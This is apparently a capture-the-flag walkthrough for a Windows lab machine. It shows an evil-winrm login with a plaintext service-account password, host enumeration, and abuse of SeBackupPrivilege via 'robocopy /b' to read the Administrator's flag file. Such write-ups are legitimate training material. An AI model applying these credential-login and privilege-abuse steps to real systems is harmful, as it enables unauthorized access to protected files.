Log in to the target as `svc-printer` via WinRM and retrieve the user flag.

```bash
$ evil-winrm -i 10.129.95.241 -u return.local\\svc-printer -p '1edFg43012!!'

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-printer\Documents> ls ..\Desktop


    Directory: C:\Users\svc-printer\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        12/6/2021   8:36 AM             34 user.txt
```

---

## Situational Awareness as `svc-printer`

Current access token information. The current process is of high integrity and has several interesting privileges, including `SeBackupPrivilege` and `SeRestorePrivilege`.

```powershell
*Evil-WinRM* PS C:\Users\svc-printer\Documents> whoami /all

USER INFORMATION
----------------

User Name          SID
================== =============================================
return\svc-printer S-1-5-21-3750359090-2939318659-876128439-1103


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Server Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
BUILTIN\Print Operators                    Alias            S-1-5-32-550 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeLoadDriverPrivilege         Load and unload device drivers      Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

System information. `svc-printer` doesn't appear to have permission to query WMI.

```powershell
*Evil-WinRM* PS C:\Users\svc-printer\Documents> systeminfo
Program 'systeminfo.exe' failed to run: Access is deniedAt line:1 char:1
+ systeminfo
+ ~~~~~~~~~~.
At line:1 char:1
+ systeminfo
+ ~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed

*Evil-WinRM* PS C:\Users\svc-printer\Documents> [System.Environment]::OSVersion.Version
Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      17763  0

*Evil-WinRM* PS C:\Users\svc-printer\Documents> Get-CimInstance -ClassName "CIM_OperatingSystem"
Access denied
At line:1 char:1
+ Get-CimInstance -ClassName "CIM_OperatingSystem"
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (root\cimv2:CIM_OperatingSystem:String) [Get-CimInstance], CimException
    + FullyQualifiedErrorId : HRESULT 0x80041003,Microsoft.Management.Infrastructure.CimCmdlets.GetCimInstanceCommand
```

Installed updates. Again, no permission to query WMI.

```powershell
*Evil-WinRM* PS C:\Users\svc-printer\Documents> Get-Hotfix
Access denied
At line:1 char:1
+ Get-Hotfix
+ ~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Get-HotFix], ManagementException
    + FullyQualifiedErrorId : System.Management.ManagementException,Microsoft.PowerShell.Commands.GetHotFixCommand

*Evil-WinRM* PS C:\Users\svc-printer\Documents> Get-CimInstance -ClassName "Win32_QuickFixEngineering"
Access denied
At line:1 char:1
+ Get-CimInstance -ClassName "Win32_QuickFixEngineering"
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (root\cimv2:Win32_QuickFixEngineering:String) [Get-CimInstance], CimException
    + FullyQualifiedErrorId : HRESULT 0x80041003,Microsoft.Management.Infrastructure.CimCmdlets.GetCimInstanceCommand
```

Running processes.

```powershell
*Evil-WinRM* PS C:\Users\svc-printer\Documents> Get-Process

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    148       9     6640      12248       0.05   1100   0 conhost
    456      17     2220       5308               372   0 csrss
    162       9     1708       4732               484   1 csrss
    395      32    16400      22668              2916   0 dfsrs
    153       8     2028       6156              1816   0 dfssvc
    251      14     4032      13516              3648   0 dllhost
  10369    7403   130140     127808              2948   0 dns
    527      22    16432      35272               360   1 dwm
     49       6     1500       3904              4288   0 fontdrvhost
     49       6     1612       4152              4292   1 fontdrvhost
      0       0       56          8                 0   0 Idle
    129      12     1924       5680              2992   0 ismserv
    463      26    10040      43020              4524   1 LogonUI
   1635     182    69072      64080               628   0 lsass
    425      30    38112      47812              2888   0 Microsoft.ActiveDirectory.WebServices
    223      13     3016      10300              3944   0 msdtc
      0      12      392      10328                88   0 Registry
    571      14     5508      13300               616   0 services
     53       3      504       1172               264   0 smss
    467      23     5788      16244              2828   0 spoolsv
    258      13     3372      10724                64   0 svchost
    309      16    13992      16196               300   0 svchost
    173      10     1788       8084               488   0 svchost
    132       8     2828       9444               496   0 svchost
    342      19    17952      34888               508   0 svchost
    118      14     3380       7444               752   0 svchost
    205      12     1740       7184               768   0 svchost
     85       5      876       3800               828   0 svchost
    643      16     5240      14404               848   0 svchost
    698      19     4044      10608               904   0 svchost
    227      10     1696       6828               944   0 svchost
    116       7     1284       5852               996   0 svchost
    220       9     2300       7712              1064   0 svchost
    344      13    11120      15316              1108   0 svchost
    251      14     3492       9412              1124   0 svchost
    371      17     5192      13176              1304   0 svchost
    413      33     6420      15732              1368   0 svchost
    252      15     2972      11848              1436   0 svchost
    230      12     2744      11400              1496   0 svchost
    312      10     2436       8352              1504   0 svchost
    427       9     2720       8888              1512   0 svchost
    115       7     1176       5536              1528   0 svchost
    357      17     4588      13792              1580   0 svchost
    130       8     1328       5720              1660   0 svchost
    178      10     1776       8444              1700   0 svchost
    305      11     2024       8848              1740   0 svchost
    182      11     1964       8080              1776   0 svchost
    138       9     1540       6636              1856   0 svchost
    152       8     1884       7184              1916   0 svchost
    167      12     1808       7412              1948   0 svchost
    261      13     2588       7868              1964   0 svchost
    217      12     2204       8984              1972   0 svchost
    161      10     2096      12760              2056   0 svchost
    417      16    12368      21404              2096   0 svchost
    467      17     3440      12356              2204   0 svchost
    233      14     4804      12024              2484   0 svchost
    279      20     3828      13316              2540   0 svchost
    206      11     2408       8508              2608   0 svchost
    166      12     3904      10712              2864   0 svchost
    125       7     1308       5656              2872   0 svchost
    189      22     2564       9968              2880   0 svchost
    471      20    13576      26984              2924   0 svchost
    133       9     1664       6572              3056   0 svchost
    136       8     1560       6188              3064   0 svchost
    385      24     3456      12316              3268   0 svchost
    172      11     2416      13008              4080   0 svchost
    193      15     6036      10044              4284   0 svchost
    291      20     9788      14828              4476   0 svchost
    154       9     1908       6764              4744   0 svchost
    226      12     2636      11996              5056   0 svchost
   1440       0      192        132                 4   0 System
    169      12     3216      10564              2016   0 VGAuthService
    132       8     1616       6608              1328   0 vm3dservice
    385      22    10392      21808              1292   0 vmtoolsd
    171      11     1492       6852               476   0 wininit
    240      12     2628      14712               540   1 winlogon
    350      16     9024      18640              3616   0 WmiPrvSE
    701      34    55240      81128       1.44   4460   0 wsmprovhost
```

Network shares. Nothing new here.

```powershell
*Evil-WinRM* PS C:\Users\svc-printer\Documents> Get-SmbShare

Name     ScopeName Path                                          Description
----     --------- ----                                          -----------
ADMIN$   *         C:\Windows                                    Remote Admin
C$       *         C:\                                           Default share
IPC$     *                                                       Remote IPC
NETLOGON *         C:\Windows\SYSVOL\sysvol\return.local\SCRIPTS Logon server share
SYSVOL   *         C:\Windows\SYSVOL\sysvol                      Logon server share
```

Network interfaces. Nothing new here.

```powershell
*Evil-WinRM* PS C:\Users\svc-printer\Documents> ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : printer
   Primary Dns Suffix  . . . . . . . : return.local
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : return.local
                                       htb

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : .htb
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-B9-27-74
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   IPv6 Address. . . . . . . . . . . : dead:beef::14a(Preferred)
   Lease Obtained. . . . . . . . . . : Monday, December 6, 2021 8:35:49 AM
   Lease Expires . . . . . . . . . . : Monday, December 6, 2021 12:15:59 PM
   Link-local IPv6 Address . . . . . : fe80::e900:66ee:c9a5:cec9%10(Preferred)
   IPv4 Address. . . . . . . . . . . : 10.129.95.241(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Lease Obtained. . . . . . . . . . : Monday, December 6, 2021 8:35:43 AM
   Lease Expires . . . . . . . . . . : Monday, December 6, 2021 12:16:14 PM
   Default Gateway . . . . . . . . . : 10.129.0.1
   DHCP Server . . . . . . . . . . . : 10.129.0.1
   DHCPv6 IAID . . . . . . . . . . . : 100683862
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-29-3F-F4-37-00-50-56-B9-27-74
   DNS Servers . . . . . . . . . . . : ::1
                                       1.1.1.1
                                       8.8.8.8
   NetBIOS over Tcpip. . . . . . . . : Enabled
   Connection-specific DNS Suffix Search List :
                                       htb
```

Network connections. There's nothing new here that wasn't visible from the outside.

```powershell
*Evil-WinRM* PS C:\Users\svc-printer\Documents> netstat -ano | findstr TCP
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       628
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       904
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       628
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       628
  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       904
  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       628
  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       628
  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       628
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       2888
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       476
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1108
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1580
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       628
  TCP    0.0.0.0:49671          0.0.0.0:0              LISTENING       1948
  TCP    0.0.0.0:49674          0.0.0.0:0              LISTENING       628
  TCP    0.0.0.0:49675          0.0.0.0:0              LISTENING       628
  TCP    0.0.0.0:49678          0.0.0.0:0              LISTENING       2828
  TCP    0.0.0.0:49681          0.0.0.0:0              LISTENING       616
  TCP    0.0.0.0:49698          0.0.0.0:0              LISTENING       2948
  TCP    0.0.0.0:52939          0.0.0.0:0              LISTENING       2916
  TCP    10.129.95.241:53       0.0.0.0:0              LISTENING       2948
  TCP    10.129.95.241:139      0.0.0.0:0              LISTENING       4
  TCP    10.129.95.241:5985     10.10.14.49:36720      TIME_WAIT       0
  TCP    10.129.95.241:5985     10.10.14.49:36724      TIME_WAIT       0
  TCP    10.129.95.241:5985     10.10.14.49:36728      TIME_WAIT       0
  TCP    10.129.95.241:5985     10.10.14.49:36732      TIME_WAIT       0
  TCP    10.129.95.241:5985     10.10.14.49:36734      ESTABLISHED     4
  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       2948
  TCP    [::]:80                [::]:0                 LISTENING       4
  TCP    [::]:88                [::]:0                 LISTENING       628
  TCP    [::]:135               [::]:0                 LISTENING       904
  TCP    [::]:389               [::]:0                 LISTENING       628
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:464               [::]:0                 LISTENING       628
  TCP    [::]:593               [::]:0                 LISTENING       904
  TCP    [::]:636               [::]:0                 LISTENING       628
  TCP    [::]:3268              [::]:0                 LISTENING       628
  TCP    [::]:3269              [::]:0                 LISTENING       628
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:9389              [::]:0                 LISTENING       2888
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       476
  TCP    [::]:49665             [::]:0                 LISTENING       1108
  TCP    [::]:49666             [::]:0                 LISTENING       1580
  TCP    [::]:49667             [::]:0                 LISTENING       628
  TCP    [::]:49671             [::]:0                 LISTENING       1948
  TCP    [::]:49674             [::]:0                 LISTENING       628
  TCP    [::]:49675             [::]:0                 LISTENING       628
  TCP    [::]:49678             [::]:0                 LISTENING       2828
  TCP    [::]:49681             [::]:0                 LISTENING       616
  TCP    [::]:49698             [::]:0                 LISTENING       2948
  TCP    [::]:52939             [::]:0                 LISTENING       2916
  TCP    [::1]:53               [::]:0                 LISTENING       2948
  TCP    [::1]:389              [::1]:49679            ESTABLISHED     628
  TCP    [::1]:389              [::1]:49680            ESTABLISHED     628
  TCP    [::1]:389              [::1]:49696            ESTABLISHED     628
  TCP    [::1]:389              [::1]:49697            ESTABLISHED     628
  TCP    [::1]:49679            [::1]:389              ESTABLISHED     2992
  TCP    [::1]:49680            [::1]:389              ESTABLISHED     2992
  TCP    [::1]:49696            [::1]:389              ESTABLISHED     2948
  TCP    [::1]:49697            [::1]:389              ESTABLISHED     2948
  TCP    [dead:beef::14a]:53    [::]:0                 LISTENING       2948
  TCP    [fe80::e900:66ee:c9a5:cec9%10]:53  [::]:0                 LISTENING       2948
  TCP    [fe80::e900:66ee:c9a5:cec9%10]:389  [fe80::e900:66ee:c9a5:cec9%10]:52934  ESTABLISHED     628
  TCP    [fe80::e900:66ee:c9a5:cec9%10]:389  [fe80::e900:66ee:c9a5:cec9%10]:52937  ESTABLISHED     628
  TCP    [fe80::e900:66ee:c9a5:cec9%10]:49667  [fe80::e900:66ee:c9a5:cec9%10]:52945  ESTABLISHED     628
  TCP    [fe80::e900:66ee:c9a5:cec9%10]:49667  [fe80::e900:66ee:c9a5:cec9%10]:52970  ESTABLISHED     628
  TCP    [fe80::e900:66ee:c9a5:cec9%10]:52934  [fe80::e900:66ee:c9a5:cec9%10]:389  ESTABLISHED     2916
  TCP    [fe80::e900:66ee:c9a5:cec9%10]:52937  [fe80::e900:66ee:c9a5:cec9%10]:389  ESTABLISHED     2916
  TCP    [fe80::e900:66ee:c9a5:cec9%10]:52945  [fe80::e900:66ee:c9a5:cec9%10]:49667  ESTABLISHED     2916
  TCP    [fe80::e900:66ee:c9a5:cec9%10]:52970  [fe80::e900:66ee:c9a5:cec9%10]:49667  ESTABLISHED     628
```

---

## Backing Up the System Flag

Since `svc-printer` has `SeBackupPrivilege` and `SeRestorePrivilege`, it can backup any file not in use on the system, regardless of the file's ACLs. Leverage this to backup and read the system flag.

```bash
*Evil-WinRM* PS C:\Users\svc-printer\Documents> robocopy /b C:\Users\Administrator\Desktop C:\Users\svc-printer\Documents root.txt

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Monday, December 6, 2021 12:15:28 PM
   Source : C:\Users\Administrator\Desktop\
     Dest : C:\Users\svc-printer\Documents\

    Files : root.txt

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

                           1    C:\Users\Administrator\Desktop\
            New File                  34        root.txt
  0%
100%

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :        34        34         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00
   Ended : Monday, December 6, 2021 12:15:28 PM

*Evil-WinRM* PS C:\Users\svc-printer\Documents> ls C:\Users\svc-printer\Documents


    Directory: C:\Users\svc-printer\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        12/6/2021   8:36 AM             34 root.txt
```
